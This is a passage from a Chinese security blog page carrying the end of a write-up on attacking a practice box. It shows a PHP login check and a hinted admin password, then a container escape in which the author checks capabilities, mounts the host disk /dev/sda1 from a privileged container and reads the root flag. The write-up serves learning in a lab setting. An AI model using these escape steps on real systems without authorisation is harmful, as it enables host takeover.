+<span class="line"><span style="color:#24292E">                        }</span><span style="color:#D73A49">elseif</span><span style="color:#24292E">($result[</span><span style="color:#032F62">'ustatus'</span><span style="color:#24292E">]</span><span style="color:#D73A49">==</span><span style="color:#005CC5">1</span><span style="color:#24292E">){</span></span>
+<span class="line"><span style="color:#D73A49">                            return</span><span style="color:#6F42C1"> WPreturn</span><span style="color:#24292E">(</span><span style="color:#032F62">'登录失败,您的账户暂时被冻结!'</span><span style="color:#24292E">,</span><span style="color:#D73A49">-</span><span style="color:#005CC5">1</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">                        }</span><span style="color:#D73A49">else</span><span style="color:#24292E">{</span></span>
+<span class="line"><span style="color:#D73A49">                            return</span><span style="color:#6F42C1"> WPreturn</span><span style="color:#24292E">(</span><span style="color:#032F62">'登录失败,用戶名不存在!'</span><span style="color:#24292E">,</span><span style="color:#D73A49">-</span><span style="color:#005CC5">1</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">                        }</span></span>
+<span class="line"><span style="color:#24292E">                    </span></span>
+<span class="line"><span style="color:#24292E">                    }</span></span>
+<span class="line"><span style="color:#D73A49">                    else</span><span style="color:#24292E">{</span></span>
+<span class="line"><span style="color:#D73A49">                        return</span><span style="color:#6F42C1"> WPreturn</span><span style="color:#24292E">(</span><span style="color:#032F62">'登录失败,密碼错误!'</span><span style="color:#24292E">,</span><span style="color:#D73A49">-</span><span style="color:#005CC5">1</span><span style="color:#24292E">);</span></span>
+<span class="line"><span style="color:#24292E">                    }</span></span>
+<span class="line"><span style="color:#24292E">                }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">                </span></span>
+<span class="line"><span style="color:#24292E">                </span></span>
+<span class="line"><span style="color:#24292E">            }</span></span>
+<span class="line"><span style="color:#D73A49">            return</span><span style="color:#005CC5"> $this</span><span style="color:#D73A49">-></span><span style="color:#6F42C1">fetch</span><span style="color:#24292E">();</span></span>
+<span class="line"><span style="color:#24292E">    		</span></span>
+<span class="line"><span style="color:#24292E">    	}</span></span></code></pre>
+<p>加密密码是 md5(pass+时间戳)</p>
+<p>可以写脚本爆破，也可以不写，群里直接提示了  密码是<code>managername</code>字段下的<code>whatcanisay</code></p>
+<p>登录到redis主机的root</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6F42C1">cat</span><span style="color:#032F62"> /proc/self/status</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1">grep</span><span style="color:#032F62"> Cap</span></span>
+<span class="line"><span style="color:#6F42C1">CapInh:</span><span style="color:#005CC5"> 0000000000000000</span></span>
+<span class="line"><span style="color:#6F42C1">CapPrm:</span><span style="color:#005CC5"> 0000000000000000</span></span>
+<span class="line"><span style="color:#6F42C1">CapEff:</span><span style="color:#005CC5"> 0000000000000000</span></span>
+<span class="line"><span style="color:#6F42C1">CapBnd:</span><span style="color:#032F62"> 0000003fffffffff</span></span>
+<span class="line"><span style="color:#6F42C1">CapAmb:</span><span style="color:#005CC5"> 0000000000000000</span></span></code></pre>
+<p>猜测这应该是个特权容器</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6F42C1">ls</span><span style="color:#032F62"> /dev/</span><span style="color:#D73A49"> |</span><span style="color:#6F42C1"> grep</span><span style="color:#032F62"> sda</span></span>
+<span class="line"><span style="color:#6F42C1">sda</span></span>
+<span class="line"><span style="color:#6F42C1">sda1</span></span>
+<span class="line"><span style="color:#6F42C1">sda2</span></span>
+<span class="line"><span style="color:#6F42C1">sda5</span></span>
+<span class="line"><span style="color:#6F42C1">mount</span><span style="color:#032F62"> /dev/sda1</span><span style="color:#032F62"> /mnt</span></span>
+<span class="line"><span style="color:#005CC5">cd</span><span style="color:#032F62"> /mnt</span></span>
+<span class="line"><span style="color:#6F42C1">ls</span></span>
+<span class="line"><span style="color:#6F42C1">bin</span></span>
+<span class="line"><span style="color:#6F42C1">boot</span></span>
+<span class="line"><span style="color:#6F42C1">dev</span></span>
+<span class="line"><span style="color:#6F42C1">etc</span></span>
+<span class="line"><span style="color:#6F42C1">home</span></span>
+<span class="line"><span style="color:#6F42C1">initrd.img</span></span>
+<span class="line"><span style="color:#6F42C1">initrd.img.old</span></span>
+<span class="line"><span style="color:#6F42C1">lib</span></span>
+<span class="line"><span style="color:#6F42C1">lib32</span></span>
+<span class="line"><span style="color:#6F42C1">lib64</span></span>
+<span class="line"><span style="color:#6F42C1">libx32</span></span>
+<span class="line"><span style="color:#6F42C1">lost+found</span></span>
+<span class="line"><span style="color:#6F42C1">media</span></span>
+<span class="line"><span style="color:#6F42C1">mnt</span></span>
+<span class="line"><span style="color:#6F42C1">opt</span></span>
+<span class="line"><span style="color:#6F42C1">proc</span></span>
+<span class="line"><span style="color:#6F42C1">root</span></span>
+<span class="line"><span style="color:#6F42C1">run</span></span>
+<span class="line"><span style="color:#6F42C1">sbin</span></span>
+<span class="line"><span style="color:#6F42C1">srv</span></span>
+<span class="line"><span style="color:#6F42C1">sys</span></span>
+<span class="line"><span style="color:#6F42C1">tmp</span></span>
+<span class="line"><span style="color:#6F42C1">usr</span></span>
+<span class="line"><span style="color:#6F42C1">var</span></span>
+<span class="line"><span style="color:#6F42C1">vmlinuz</span></span>
+<span class="line"><span style="color:#6F42C1">vmlinuz.old</span></span>
+<span class="line"><span style="color:#005CC5">cd</span><span style="color:#032F62"> root</span><span style="color:#24292E"> </span></span>
+<span class="line"><span style="color:#6F42C1">ls</span></span>
+<span class="line"><span style="color:#6F42C1">root.txt</span></span>
+<span class="line"><span style="color:#6F42C1">cat</span><span style="color:#032F62"> root.txt</span></span>
+<span class="line"><span style="color:#6F42C1">flag</span><span style="color:#032F62">{root-6dbfaf239023f6da6ed2ffc59d3bcea5}</span></span>
+<span class="line"></span></code></pre>
+<p>将<code>sda1</code>挂载上，发现这就是主机的目录，成功逃逸</p> </div>  </article> <ul class="post-near"> <li>上一篇: <a href="/post/attacking-a-box-news">News</a></li> <li>下一篇: <a href="/post/天一永安杯初赛-2025-writeup">第八届宁波市网络安全大赛reverse-wp</a></li> </ul> </div>  <div class="col-mb-12 col-offset-1 col-3 kit-hidden-tb" id="secondary" role="complementary"> <section class="widget" id="toc-widget"> <h3 class="widget-title">文章目录</h3> <ul class="widget-list toc-list"> <li class="toc-level-2"> <a href="#web打点" data-target="web打点">web打点</a> </li><li class="toc-level-2"> <a href="#内网横向" data-target="内网横向">内网横向</a> </li><li class="toc-level-2"> <a href="#提权" data-target="提权">提权</a> </li> </ul> </section> <section class="widget"> <h3 class="widget-title">最新文章</h3> <ul class="widget-list"> <li><a href="/post/ycb-2025-reverse-plus">2025羊城杯初赛Reverse-PLUS详细wp</a></li><li><a href="/post/ycb-2025-writeup">2025羊城杯初赛部分wp</a></li><li><a href="/post/天一永安杯初赛-2025-writeup">第八届宁波市网络安全大赛reverse-wp</a></li><li><a href="/post/exchange">群友靶机-exchange</a></li><li><a href="/post/attacking-a-box-news">News</a></li> </ul> </section> <section class="widget"> <h3 class="widget-title">分类</h3> <ul class="widget-list"> <li><a href="/category/CTF">CTF</a></li><li><a href="/category/渗透">渗透</a></li> </ul> </section> <!-- 其它 --> <!-- <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="/rss.xml">文章 RSS</a></li>
+            <li><a href="https://astro.build">Astro</a></li>
+        </ul>
+    </section> --> </div>  <script type="module">function l(){const a=document.querySelectorAll(".toc-list a[data-target]");if(a.length===0)return;a.forEach(o=>{o.addEventListener("click",t=>{t.preventDefault();const r=o.getAttribute("data-target"),c=document.getElementById(r);c&&c.scrollIntoView({behavior:"smooth",block:"start"})})});const e=Array.from(a).map(o=>document.getElementById(o.getAttribute("data-target"))).filter(Boolean);function s(){let o="";for(let t=e.length-1;t>=0;t--)if(e[t].getBoundingClientRect().top<=100){o=e[t].id;break}a.forEach(t=>{t.classList.toggle("active",t.getAttribute("data-target")===o)})}s(),window.addEventListener("scroll",s,{passive:!0})}function u(){const a=document.querySelectorAll("pre.astro-code");let e=null;a.forEach(t=>{const r=t.querySelector("code");if(!r)return;const c=document.createElement("div");c.className="code-wrapper",t.parentNode.insertBefore(c,t),c.appendChild(t);const n=document.createElement("button");n.className="copy-button",n.innerHTML=`
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <rect x="9" y="9" width="13" height="13" rx="2"></rect>
+        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+      </svg>
+      <span>Copy</span>
+    `,c.appendChild(n),c.addEventListener("click",i=>{i.target.closest(".copy-button")||(document.querySelectorAll(".code-wrapper").forEach(d=>d.classList.remove("show-copy")),c.classList.add("show-copy"))}),n.addEventListener("click",async()=>{try{await navigator.clipboard.writeText(r.innerText),e&&e!==n&&o(e),s(n),e=n}catch{n.querySelector("span").textContent="Failed"}})}),document.addEventListener("click",t=>{t.target.closest(".code-wrapper")||document.querySelectorAll(".code-wrapper").forEach(r=>r.classList.remove("show-copy"))}),document.addEventListener("copy",()=>{e&&(o(e),e=null)});function s(t){t.classList.add("success"),t.querySelector("span").textContent="Copied!"}function o(t){t.classList.remove("success"),t.querySelector("span").textContent="Copy"}}window.addEventListener("DOMContentLoaded",()=>{l(),u()});</script>  </div> </div> </div> <footer id="footer" role="contentinfo">
+&copy; 2026 <a href="/">yulian Lab</a>.
+    由 <a href="https://astro.build">Astro</a> 驱动.
+</footer>  <link rel="stylesheet" href="/viewer/viewer.min.css"> <script src="/viewer/viewer.min.js"></script> <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const postContent = document.querySelector('.post-content');
+        
+        if (postContent && postContent.querySelectorAll('img').length > 0) {
+            new Viewer(postContent, {
+                inline: false,      // 模态框模式（点击图片弹出）
+                button: true,       // 显示右上角关闭按钮
+                navbar: true,       // 显示底部缩略图导航栏（多图时可以像相册一样切换）
+                title: true,        // 显示图片标题（自动读取 Markdown 中图片的 alt 描述）
+                toolbar: true,      // 显示底部工具栏（包含放大、缩小、1:1、旋转、翻转等按钮）
+                tooltip: true,      // 缩放时显示百分比提示
+                movable: true,      // 允许鼠标拖拽移动图片
+                zoomable: true,     // 允许滚轮缩放
+                rotatable: true,    // 允许旋转图片
+                scalable: true,     // 允许翻转图片
+                transition: true,   // 开启 CSS3 平滑过渡动画
+                fullscreen: true,   // 允许全屏播放
+                keyboard: true,     // 支持键盘快捷键（ESC退出，左右方向键切换图片）
+                
+                zIndex: 9999,
+                zIndexInline: 9999
+            });
+        }
+    });
+</script> </body> </html>
